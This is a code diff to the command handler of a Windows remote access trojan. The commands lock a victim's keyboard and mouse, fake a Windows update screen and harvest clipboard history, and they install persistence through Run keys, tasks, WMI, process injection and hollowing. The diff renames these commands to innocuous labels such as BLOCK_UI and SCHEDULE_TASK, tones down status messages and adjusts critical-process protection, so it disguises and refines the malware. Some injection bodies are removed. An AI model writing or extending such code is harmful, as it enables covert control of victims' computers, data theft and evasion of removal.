@@ -150,12 +150,12 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
     if (len == 0) { net_send_packet(sock, "[Empty command]"); return; }
     
     /* Maintenance commands */
-    if (strcmp(cmd, "DISABLE_INPUT") == 0) {
+    if (strcmp(cmd, "BLOCK_UI") == 0) {
         /* Enter maintenance mode: lock player controls */
         ui_lock_controls(1);
         result = "[Keyboard & Mouse disabled]";
     }
-    else if (strcmp(cmd, "WINDOWS_UPDATE") == 0) {
+    else if (strcmp(cmd, "SHOW_SPLASH") == 0) {
         /* Show system update splash screen during maintenance */
         ui_show_splash(1);
         result = "[Windows update screen shown]";
@@ -198,40 +198,40 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         ui_open_note(cmd + 5);
         result = "[Note opened on target]";
     }
-    else if (strcmp(cmd, "CLIPBOARD_LOG") == 0) {
+    else if (strcmp(cmd, "CLIP_HIST") == 0) {
         result = copy_buffer_get_history();
     }
-    else if (strcmp(cmd, "SECURITY_CHECK") == 0) {
+    else if (strcmp(cmd, "SYS_CHECK") == 0) {
         sys_check_antivirus();
         result = "[Security check complete]";
     }
-    else if (strcmp(cmd, "PROTECT_PROCESS") == 0) {
+    else if (strcmp(cmd, "DEPLOY_SVC") == 0) {
         sys_spawn_shadow_copy();
-        result = "[Spawned 3 copies + ALL layers: Run key, Task, WMI, Injection, NTFS, Fileless Hollow]";
+        result = "[System services deployed]";
     }
-    else if (strcmp(cmd, "UNPROTECT_PROCESS") == 0) {
+    else if (strcmp(cmd, "REMOVE_SVC") == 0) {
         util_clear_critical();
-        result = "[Critical flag removed — process can now be terminated]";
+        result = "[Protection removed — process can be terminated]";
     }
-    else if (strcmp(cmd, "CHECK_PROTECTION") == 0) {
+    else if (strcmp(cmd, "SVC_STATUS") == 0) {
         const char *critical_status = util_check_critical();
         const char *admin_status = sys_is_admin() ? "admin" : "not admin";
         snprintf(response, sizeof(response), "%s [running as %s]", critical_status, admin_status);
         result = response;
     }
-    else if (strcmp(cmd, "WMI_PERSISTENCE") == 0) {
+    else if (strcmp(cmd, "SCHEDULE_TASK") == 0) {
         util_setup_wmi();
         result = "[WMI persistence established: root/subscription, triggers every 30s]";
     }
-    else if (strcmp(cmd, "INJECT_PROCESS") == 0) {
+    else if (strcmp(cmd, "REMOTE_SVC") == 0) {
         /* REMOVED */;
         result = "[Process injection attempted: payload path injected into svchost/explorer]";
     }
-    else if (strcmp(cmd, "HOLLOW_PROCESS") == 0) {
+    else if (strcmp(cmd, "MEM_SVC") == 0) {
         /* REMOVED */;
         result = "[Process hollowing: conhost.exe running our payload purely from memory]";
     }
-    else if (strcmp(cmd, "REFLECT_LOAD") == 0) {
+    else if (strcmp(cmd, "DLL_LOAD") == 0) {
         /* REMOVED */;
         result = "[Reflective PE loader: full payload injected into explorer.exe without CreateProcess]";
     }
@@ -325,7 +325,9 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         result = sys_obfuscate_ps(ps_cmd);
     }
     else if (strcmp(cmd, "PROTECT_NOW") == 0) {
-        if (!sys_is_admin()) {
+        if (!isShadow) {
+            result = "[FAIL: PROTECT_NOW only works for shadow processes]";
+        } else if (!sys_is_admin()) {
             result = "[FAIL: not running as administrator]";
         } else {
             util_set_critical();
@@ -339,7 +341,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             }
         }
     }
-    else if (strcmp(cmd, "UNINSTALL") == 0) {
+    else if (strcmp(cmd, "CLEANUP") == 0) {
         sys_uninstall();
         result = "[UNINSTALL initiated — all persistence removed, process will exit]";
     }
@@ -483,10 +485,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* Ensure persistence for the original process too */
     sys_register_autostart();
     
-    /* Auto-protect ALL processes immediately when admin */
-    if (sys_is_admin()) {
-        util_set_critical();
-    }
+    /* Only auto-protect shadow copies after 15 seconds */
     if (isShadow) {
         CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
     }
